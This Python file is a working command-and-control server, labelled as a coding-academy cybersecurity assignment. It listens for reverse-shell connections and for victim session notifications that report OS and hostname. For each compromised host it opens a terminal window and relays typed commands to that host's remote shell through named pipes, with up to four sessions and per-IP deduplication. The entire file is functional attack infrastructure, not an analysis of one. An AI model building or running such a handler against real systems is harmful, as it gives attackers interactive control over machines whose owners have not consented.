#!/usr/bin/env python3
"""
Enhanced C2 Manager with Real Shell Integration and IP Deduplication
Rwanda Coding Academy - Cybersecurity Assignment
Supports up to 4 simultaneous users with separate terminals
Prevents multiple sessions from same IP address
"""

import socket
import threading
import time
import subprocess
import signal
import sys
import os
import select
from datetime import datetime

class RealShellC2Manager:
    def __init__(self, lhost="0.0.0.0", shell_port=4444, notify_port=4445, max_users=4):
        self.lhost = lhost
        self.shell_port = shell_port
        self.notify_port = notify_port
        self.max_users = max_users
        self.sessions = {}
        self.session_counter = 0
        self.active_terminals = {}
        self.running = True
        self.command_pipes = {}
        self.active_ips = {}  # Track IPs to prevent duplicates

    def handle_notifications(self):
        """Handle incoming session notifications"""
        s = socket.socket()
        s.bind((self.lhost, self.notify_port))
        s.listen(5)
        print(f"[+] Notification listener: :{self.notify_port}")

        while self.running:
            try:
                client, addr = s.accept()
                data = client.recv(1024).decode()
                if data.startswith("NEW_SESSION:"):
                    _, sess_id, os_type, hostname, status = data.split(":", 4)
                    self.sessions[sess_id] = {
                        'os': os_type, 'host': hostname, 'status': status,
                        'ip': addr[0], 'time': datetime.now().strftime("%H:%M:%S")
                    }
                    print(f"🌟 NEW SESSION [{self.session_counter+1}]: {sess_id} ({os_type}/{hostname}) - {status}")
                    self.session_counter += 1
            except:
                break
            client.close()

    def create_user_terminal(self, session_name, client_socket, addr):
        """Create a new terminal window with real shell connection"""
        client_ip = addr[0]

        # Check if this IP already has an active session
        if client_ip in self.active_ips:
            print(f"🔄 IP {client_ip} already has active session. Updating existing terminal...")
            # Update existing session with new socket
            existing_user_num = self.active_ips[client_ip]
            if existing_user_num in self.active_terminals:
                # Close old socket and replace with new one
                try:
                    self.active_terminals[existing_user_num]['socket'].close()
                except:
                    pass
                self.active_terminals[existing_user_num]['socket'] = client_socket
                print(f"✅ Updated User-{existing_user_num} with new connection from {client_ip}")
                return existing_user_num
            else:
                # Clean up stale entry
                del self.active_ips[client_ip]

        if len(self.active_terminals) >= self.max_users:
            print(f"⚠️  Max users ({self.max_users}) reached. Rejecting {session_name}")
            client_socket.close()
            return None

        user_num = len(self.active_terminals) + 1
        terminal_title = f"User-{user_num}: {session_name}"

        # Track this IP
        self.active_ips[client_ip] = user_num

        # Calculate window position for neat layout
        positions = [
            (100, 100),   # User-1: top-left
            (600, 100),   # User-2: top-right
            (100, 400),   # User-3: bottom-left
            (600, 400),   # User-4: bottom-right
        ]
        pos = positions[(user_num - 1) % len(positions)]

        # Create named pipes for communication
        pipe_in = f"/tmp/c2_cmd_{user_num}"
        pipe_out = f"/tmp/c2_resp_{user_num}"

        # Create pipes if they don't exist
        try:
            os.mkfifo(pipe_in)
            os.mkfifo(pipe_out)
        except FileExistsError:
            pass

        # Create a real shell interaction script
        script_content = f'''#!/bin/bash
clear
echo "🔗 Real C2 Session - User-{user_num}"
echo "🎯 Target: {session_name} ({addr[0]}:{addr[1]})"
echo "⏰ Connected: {datetime.now().strftime('%H:%M:%S')}"
echo "🎓 Rwanda Coding Academy - Cybersecurity Assignment"
echo "📝 Type real commands below, 'exit' to disconnect"
echo "============================================"
echo ""

# Real shell command loop
while true; do
    echo -n "User-{user_num}@{session_name}> "
    read -r cmd

    if [[ "$cmd" == "exit" ]]; then
        echo "🔌 Disconnecting..."
        echo "EXIT" > "{pipe_in}"
        break
    elif [[ -n "$cmd" ]]; then
        # Send command to shell handler
        echo "$cmd" > "{pipe_in}"
        # Read response
        if [[ -p "{pipe_out}" ]]; then
            response=$(cat "{pipe_out}")
            echo "$response"
        fi
    fi
done

echo "👋 Session ended. This terminal will close in 3 seconds..."
sleep 3
'''

        script_path = f"/tmp/user_{user_num}_real_session.sh"
        with open(script_path, 'w') as f:
            f.write(script_content)
        os.chmod(script_path, 0o755)

        # Store connection info
        self.active_terminals[user_num] = {
            'process': None,
            'script': script_path,
            'session': session_name,
            'socket': client_socket,
            'addr': addr,
            'pipe_in': pipe_in,
            'pipe_out': pipe_out
        }

        # Start shell handler thread
        threading.Thread(target=self.handle_shell_connection,
                       args=(client_socket, user_num, session_name), daemon=True).start()

        # Open new terminal
        try:
            terminal_cmd = [
                'gnome-terminal',
                '--title', terminal_title,
                '--geometry', f'80x20+{pos[0]}+{pos[1]}',
                '--', 'bash', script_path
            ]

            terminal_proc = subprocess.Popen(terminal_cmd)
            self.active_terminals[user_num]['process'] = terminal_proc

            print(f"🖥️  Opened terminal: User-{user_num} for {session_name}")
            return user_num

        except Exception as e:
            print(f"❌ Failed to open terminal: {e}")
            client_socket.close()
            return None

    def handle_shell_connection(self, client_socket, user_num, session_name):
        """Handle real shell connection and pipe communication"""
        pipe_in = self.active_terminals[user_num]['pipe_in']
        pipe_out = self.active_terminals[user_num]['pipe_out']

        try:
            while self.running:
                # Check for commands from pipe
                if os.path.exists(pipe_in):
                    with open(pipe_in, 'r') as f:
                        cmd = f.read().strip()

                    if cmd == "EXIT":
                        break
                    elif cmd:
                        # Send command to real shell
                        try:
                            client_socket.send((cmd + '\n').encode())

                            # Read response
                            response = ""
                            client_socket.settimeout(2.0)
                            while True:
                                try:
                                    data = client_socket.recv(1024).decode()
                                    if not data:
                                        break
                                    response += data
                                    if response.endswith('> ') or '\n' in response:
                                        break
                                except socket.timeout:
                                    break

                            # Send response back to terminal
                            with open(pipe_out, 'w') as f:
                                f.write(response)

                        except Exception as e:
                            print(f"Command error: {e}")
                            break

                time.sleep(0.1)

        except Exception as e:
            print(f"Shell handler error: {e}")
        finally:
            self.cleanup_terminal(user_num, session_name)

    def handle_shell(self):
        """Handle incoming shell connections with auto-terminal opening"""
        s = socket.socket()
        s.bind((self.lhost, self.shell_port))
        s.listen(5)
        print(f"[+] Shell listener: :{self.shell_port}")
        print("🖥️  Real shell mode: ON (max 4 users)")
        print("📊 Active terminals:", len(self.active_terminals))
        print("🎮 Waiting for connections...")

        while self.running:
            try:
                client, addr = s.accept()
                sess_name = f"{addr[0]}:{addr[1]}"
                print(f"\n🐚 NEW CONNECTION: {sess_name}")

                # Auto-create terminal for this session
                terminal_id = self.create_user_terminal(sess_name, client, addr)

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"❌ Connection error: {e}")

    def cleanup_terminal(self, terminal_id, sess_name):
        """Clean up terminal and pipes when user disconnects"""
        if terminal_id and terminal_id in self.active_terminals:
            term_info = self.active_terminals[terminal_id]
            client_ip = term_info['addr'][0]

            # Remove IP tracking
            if client_ip in self.active_ips:
                del self.active_ips[client_ip]

            # Kill terminal process
            try:
                if term_info['process']:
                    term_info['process'].terminate()
                    term_info['process'].wait(timeout=3)
            except:
                try:
                    if term_info['process']:
                        term_info['process'].kill()
                except:
                    pass

            # Remove script file
            try:
                os.remove(term_info['script'])
            except:
                pass

            # Remove pipes
            try:
                os.remove(term_info['pipe_in'])
                os.remove(term_info['pipe_out'])
            except:
                pass

            # Close socket
            try:
                term_info['socket'].close()
            except:
                pass

            # Remove from active terminals
            del self.active_terminals[terminal_id]

            print(f"🧹 Cleaned up terminal: User-{terminal_id} (IP: {client_ip})")

    def signal_handler(self, signum, frame):
        """Handle cleanup on exit"""
        print("\n🛑 Shutting down Real C2 Manager...")
        self.running = False

        # Clean up all terminals
        for term_id in list(self.active_terminals.keys()):
            self.cleanup_terminal(term_id, "shutdown")

        print("✅ All terminals closed. Goodbye!")
        sys.exit(0)

    def run(self):
        """Run the real C2 manager"""
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        print("🚀 Real C2 Manager Started")
        print(f"Shell: :{self.shell_port} | Notify: :{self.notify_port}")
        print(f"🖥️  Real shell mode: ON (max {self.max_users} users)")
        print("🎓 Rwanda Coding Academy - Cybersecurity Assignment")
        print("📝 Press Ctrl+C to shutdown all terminals")
        print()

        # Start notification thread
        notify_thread = threading.Thread(target=self.handle_notifications, daemon=True)
        notify_thread.start()

        # Start shell handler
        self.handle_shell()

if __name__ == "__main__":
    RealShellC2Manager(max_users=4).run()
